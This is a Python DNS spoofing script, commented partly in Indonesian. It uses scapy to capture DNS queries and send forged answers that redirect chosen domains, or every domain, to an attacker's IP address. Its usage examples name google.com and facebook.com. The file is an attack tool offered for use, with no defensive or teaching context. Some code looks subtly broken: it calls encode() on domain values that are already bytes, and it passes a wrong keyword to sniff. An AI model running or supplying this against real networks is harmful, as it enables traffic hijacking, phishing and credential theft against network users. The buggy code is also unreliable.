#!/usr/bin/env python3
"""
DNS Spoofing Script
Menangkap DNS query dan mengirim response palsu
"""

from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, conf
import sys

# Disable verbose
conf.verb = 0

class DNSSpoofar:
    def __init__(self, fake_ip, target_domains=None, interface=None, dns_server="8.8.8.8"):
        self.fake_ip = fake_ip
        self.target_domains = target_domains or []
        self.interface = interface
        self.dns_server = dns_server
        self.packet_count = 0

    def dns_response(self, pkt):
        """Callback function untuk handle DNS query"""
        if DNS not in pkt or DNSQR not in pkt:
            return

        # Get query name
        qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore')

        # Check if we should spoof this query
        should_spoof = False
        if not self.target_domains:
            should_spoof = True  # Spoof semua
        else:
            for domain in self.target_domains:
                if domain.encode() in pkt[DNSQR].qname:
                    should_spoof = True
                    break

        if should_spoof and pkt[DNS].opcode == 0:  # Standard query
            self.packet_count += 1
            print(f"[{self.packet_count}] Query: {qname} -> {self.fake_ip}")

            # Create spoofed DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10,
                                     rdata=self.fake_ip))

            # Send response
            from scapy.all import send
            send(spoofed_pkt, verbose=0)
            print(f"    [+] Spoofed response sent!")

    def start(self, packet_count=0):
        """Start sniffing DNS queries"""
        print(f"[*] DNS Spoofer Started")
        print(f"[*] Fake IP: {self.fake_ip}")
        print(f"[*] Target Domains: {self.target_domains if self.target_domains else 'ALL'}")
        print(f"[*] Interface: {self.interface or 'default'}")
        print(f"[!] Press Ctrl+C to stop\n")

        try:
            sniff(
                filter="udp port 53",
                prn=self.dns_response,
                interface=self.interface,
                store=0
            )
        except KeyboardInterrupt:
            print(f"\n[!] Stopped. Total queries spoofed: {self.packet_count}")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 dns_spoof.py <fake_ip> [domain1,domain2,...] [interface]")
        print("\nExamples:")
        print("  # Spoof all queries to 192.168.70.2")
        print("  python3 dns_spoof.py 192.168.70.2")
        print()
        print("  # Spoof only example.com queries")
        print("  python3 dns_spoof.py 192.168.70.2 example.com")
        print()
        print("  # Spoof multiple domains")
        print("  python3 dns_spoof.py 192.168.70.2 'example.com,google.com,facebook.com'")
        print()
        print("  # Specify interface (for advanced use)")
        print("  python3 dns_spoof.py 192.168.70.2 example.com eth0")
        sys.exit(1)

    fake_ip = sys.argv[1]

    # Parse target domains
    target_domains = []
    if len(sys.argv) > 2:
        domains_str = sys.argv[2]
        target_domains = [d.strip().encode() for d in domains_str.split(',')]

    # Parse interface
    interface = sys.argv[3] if len(sys.argv) > 3 else None

    # Create and start spoofer
    spoofer = DNSSpoofar(fake_ip, target_domains, interface)
    spoofer.start()
